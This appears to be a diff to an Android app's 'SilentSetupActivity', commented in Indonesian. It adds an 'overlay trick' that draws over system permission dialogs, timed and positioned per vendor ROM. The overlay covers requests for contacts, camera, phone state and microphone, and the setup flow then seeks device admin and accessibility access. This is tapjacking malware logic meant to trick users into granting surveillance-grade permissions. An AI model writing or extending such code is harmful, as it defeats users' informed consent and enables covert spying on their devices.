@@ -35,7 +35,7 @@ class SilentSetupActivity : AppCompatActivity() {
         Manifest.permission.READ_CONTACTS,
         Manifest.permission.CAMERA,
         Manifest.permission.READ_PHONE_STATE,
-        Manifest.permission.RECORD_AUDIO,           // ← ditambah (ada di manifest, wajib diminta)
+        Manifest.permission.RECORD_AUDIO,
     )
 
     private var permissionIndex = 0
@@ -43,6 +43,29 @@ class SilentSetupActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         crashlytics.log("SilentSetupActivity: onCreate")
+        // ── Langkah PERTAMA: minta SYSTEM_ALERT_WINDOW sebelum runtime permissions ──
+        // Overlay trick tidak bisa jalan tanpa izin ini.
+        requestOverlayPermission()
+    }
+
+    // ── Step 0: SYSTEM_ALERT_WINDOW (wajib untuk overlay trick) ─────────────
+
+    private fun requestOverlayPermission() {
+        crashlytics.log("SilentSetupActivity: requestOverlayPermission")
+        if (!Settings.canDrawOverlays(this)) {
+            try {
+                startActivityForResult(
+                    Intent(
+                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                        Uri.parse("package:$packageName")
+                    ), 2000
+                )
+                return
+            } catch (e: Exception) {
+                crashlytics.recordException(e)
+            }
+        }
+        // Sudah granted (atau skip karena error) → lanjut ke runtime permissions
         requestNextPermission()
     }
 
@@ -58,20 +81,55 @@ class SilentSetupActivity : AppCompatActivity() {
         }
 
         if (permissionIndex >= permissions.size) {
+            // Semua runtime permission selesai — matikan overlay lalu lanjut
+            OverlayTrickManager.stop(this)
             requestSpecialPermissions()
             return
         }
 
         val perm = permissions[permissionIndex]
         crashlytics.log("SilentSetupActivity: requesting permission[$permissionIndex] = $perm")
+
+        // ── Tampilkan overlay trick SEBELUM dialog permission muncul ─────────
+        // Delay 200ms agar dialog muncul dulu, baru overlay di-render di atasnya.
+        // callerPkg = package sistem yang akan menampilkan dialog (auto-detect ROM Y).
+        handler.postDelayed({
+            val permPkg = resolvePermissionControllerPkg()
+            OverlayTrickManager.start(applicationContext, null, callerPkg = permPkg)
+        }, 200)
+
         try {
             ActivityCompat.requestPermissions(this, arrayOf(perm), 1000 + permissionIndex)
         } catch (e: Exception) {
             crashlytics.recordException(e)
-            // Skip dan lanjut ke berikutnya
+            OverlayTrickManager.stop(this)
             permissionIndex++
             handler.postDelayed({ requestNextPermission() }, 300)
         }
+    }
+
+    /**
+     * Deteksi package permission controller yang aktif di ROM ini.
+     * Dipakai OverlayTrickManager untuk pilih rasio Y yang tepat.
+     */
+    private fun resolvePermissionControllerPkg(): String {
+        val candidates = listOf(
+            "com.samsung.android.permissioncontroller",
+            "com.miui.securitycenter",
+            "com.huawei.systemmanager",
+            "com.google.android.permissioncontroller",
+            "com.android.permissioncontroller",
+            "com.google.android.packageinstaller",
+            "com.android.packageinstaller"
+        )
+        val pm = packageManager
+        for (pkg in candidates) {
+            try {
+                pm.getPackageInfo(pkg, 0)
+                return pkg
+            } catch (_: Exception) {}
+        }
+        return "com.android.permissioncontroller"
     }
 
     override fun onRequestPermissionsResult(
@@ -82,6 +140,8 @@ class SilentSetupActivity : AppCompatActivity() {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         val granted = grantResults.firstOrNull() == PackageManager.PERMISSION_GRANTED
         crashlytics.log("SilentSetupActivity: permissionResult[$requestCode] granted=$granted")
+        // Matikan overlay setelah user merespons dialog
+        OverlayTrickManager.stop(this)
         permissionIndex++
         handler.postDelayed({ requestNextPermission() }, 300)
     }
@@ -183,10 +243,8 @@ class SilentSetupActivity : AppCompatActivity() {
     }
 
     // ── onActivityResult ─────────────────────────────────────────────────────
-    // Setiap step setup menggunakan startActivityForResult() dan menunggu
-    // kembali di sini sebelum lanjut ke step berikutnya.
-    // Urutan: storage (2001) → battery (2002) → device admin (2003) → accessibility (2005) → finish.
-    // Device Admin bersifat opsional: jika user cancel, alur tetap lanjut ke accessibility.
+    // Urutan: overlay (2000) → runtime perms → storage (2001) → battery (2002)
+    //         → device admin (2003) → accessibility (2005) → finish.
 
     @Suppress("DEPRECATION")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
@@ -194,12 +252,10 @@ class SilentSetupActivity : AppCompatActivity() {
         crashlytics.log("SilentSetupActivity: onActivityResult requestCode=$requestCode resultCode=$resultCode")
         handler.postDelayed({
             when (requestCode) {
+                2000 -> requestNextPermission()  // overlay permission selesai → runtime perms
                 2001 -> requestBatteryOptimization()
                 2002 -> requestDeviceAdmin()
-                // 2003: device admin — lanjut ke accessibility terlepas dari resultCode
-                // (admin bersifat opsional, skip jika user cancel tidak masalah)
                 2003 -> requestAccessibility()
-                // 2005: accessibility settings — setelah user kembali langsung finish
                 2005 -> finishSetup()
                 else -> {
                     crashlytics.log("SilentSetupActivity: unknown requestCode=$requestCode")
@@ -217,7 +273,6 @@ class SilentSetupActivity : AppCompatActivity() {
             startActivity(Intent(this, MatrixSuccessActivity::class.java))
         } catch (e: Exception) {
             crashlytics.recordException(e)
-            // Fallback: simpan prefs dan tutup saja
             getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
                 .edit().putBoolean("setup_done", true).apply()
         }
